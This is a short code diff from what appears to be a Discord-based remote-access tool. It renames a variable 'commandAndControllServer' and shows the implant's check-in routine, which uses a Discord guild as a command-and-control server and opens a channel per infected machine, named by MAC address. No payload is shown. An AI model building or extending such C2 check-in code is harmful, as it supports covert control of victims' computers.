@@ -22,12 +22,12 @@ async def find_channel_by_name(guild, channel_name):
 @client.event
 async def on_ready():
 
-    commandAndControllServer = client.get_guild(int(guildid))
-    channel = await find_channel_by_name(commandAndControllServer, mac_address)
+    commandAndControlServer = client.get_guild(int(guildid))
+    channel = await find_channel_by_name(commandAndControlServer, mac_address)
     if channel:
         await channel.send("Connection reestablished")
     else:
-        channel = await commandAndControllServer.create_text_channel(mac_address)
+        channel = await commandAndControlServer.create_text_channel(mac_address)
         e = await channel.send("New Connection established")
         await e.pin()
         await channel.send("hello world")
